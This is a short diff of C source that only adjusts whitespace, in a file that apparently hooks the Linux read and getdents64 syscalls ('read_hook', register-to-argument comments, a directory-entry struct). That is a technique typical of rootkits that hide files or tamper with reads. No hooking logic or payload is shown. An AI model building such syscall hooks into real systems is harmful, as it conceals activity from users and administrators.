@@ -10,7 +10,7 @@
  * regs->di       <- RDI <- 1st argument (so the file descriptor for read)
  * regs->si       <- RSI <- 2nd argument (user‐buf pointer)
  * regs->dx       <- RDX <- 3rd argument (count)
-*/
+ */
 
 // Directory entry structure as 'returned' (by pointer) by getdents64 syscall
 // Used to read a directory content
@@ -320,7 +320,6 @@ asmlinkage long read_hook(const struct pt_regs *regs)
     size_t out_len = 0;
 
     line = strsep(&kbuf, "\n");
-
 
     while (line) {
         line_number++;
